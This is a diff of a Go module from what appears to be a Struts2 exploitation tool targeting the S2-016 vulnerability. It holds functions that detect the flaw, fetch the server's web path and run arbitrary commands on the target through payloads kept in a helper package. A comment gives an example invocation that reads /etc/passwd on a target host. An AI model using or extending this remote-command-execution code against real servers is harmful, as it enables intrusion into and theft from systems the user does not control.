@@ -1,60 +1,30 @@
 package s016
 
 import (
-	"ST2G/cvemod/x51utils"
+	"ST2G/cvemod/utils"
 	"fmt"
-	"io/ioutil"
-	"log"
-	"net/http"
-	"strings"
-	"time"
+	"github.com/fatih/color"
 )
 
-func Check(url string){
+/*
+ST2SG.exe --url http://192.168.123.128:8080/S2-016/default.action --vn 16 --mode exec --cmd "cat /etc/passwd"
+ */
+func Check(targetUrl string){
 	//s016的目的url必须带action，比如：http://xxx.com/xxx.action
-	url+=x51utils.POC_s016_check
-	req, err := http.NewRequest("GET", url, nil)
-	if err != nil {
-		log.Fatal("Error reading request. ")
-	}
-	client := &http.Client{Timeout: time.Second * 10}
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Fatal("Error reading response. ")
-	}
-	defer resp.Body.Close()
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		log.Fatal("Error reading body. ")
-	}
-	respBody := string(body)
-	isVulnable := strings.Contains(respBody, x51utils.Checkflag)
-	if isVulnable {
-		x51utils.Colorlog("Found Struts2-016!")
-
-	} else {
+	//respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s016_check)
+	headerLocation := utils.Get302Location(targetUrl+utils.POC_s016_check)
+	//fmt.Println(headerLocation)
+	if utils.IfContainsStr(headerLocation,"6308") {
+		color.Red("*Found Struts2-016！")
+	}else {
 		fmt.Println("Struts2-016 Not Vulnerable.")
 	}
 }
-func ExecCommand(url string,command string) {
-	url += x51utils.POC_s016_exec(command)
-	req, err := http.NewRequest("GET", url, nil)
-	if err != nil {
-		log.Fatal("Error reading request. ")
-	}
-	client := &http.Client{Timeout: time.Second * 10}
-
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Fatal("Error reading response. ")
-	}
-	defer resp.Body.Close()
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		log.Fatal("Error reading body. ")
-	}
-	respBody := string(body)
-	fmt.Println(respBody)
+func GetWebPath(targeturl string){
+	webpath := utils.GetFunc4Struts2(targeturl,"",utils.POC_s016_webpath)
+	color.Green(webpath)
+}
+func ExecCommand(targetUrl string,command string) {
+	respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s016_exec(command))
+	fmt.Println(respString)
 }
